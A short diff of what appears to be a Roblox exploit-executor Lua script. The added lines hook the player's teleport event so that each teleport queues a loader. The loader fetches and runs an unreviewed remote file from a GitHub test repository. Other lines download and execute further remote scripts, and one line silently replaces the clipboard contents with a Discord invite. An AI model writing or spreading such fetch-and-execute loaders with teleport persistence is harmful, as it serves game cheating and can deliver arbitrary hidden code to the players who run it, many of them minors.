@@ -1,3 +1,7 @@
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/kunariisys/test/refs/heads/main/test.luau'))()")
+end)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/unicornnmann/Loading-Animation/refs/heads/main/Unicorn"))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/unicornnmann/Join-Users/refs/heads/main/User%20Joiner'))()
 
@@ -17,14 +21,6 @@ Duration = 1
 if setclipboard then
     setclipboard("https://discord.gg/wBvQumC4") -- change text to whatever you want
 end
-
-if queue_on_teleport then
-	game.Players.LocalPlayer.OnTeleport:Connect(function()
-		task.wait(2)
-	    queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/kunariisys/test/refs/heads/main/test.luau'))()")
-	end)
-end
-
 
 -- Create the ScreenGui
 local screenGui = Instance.new("ScreenGui")
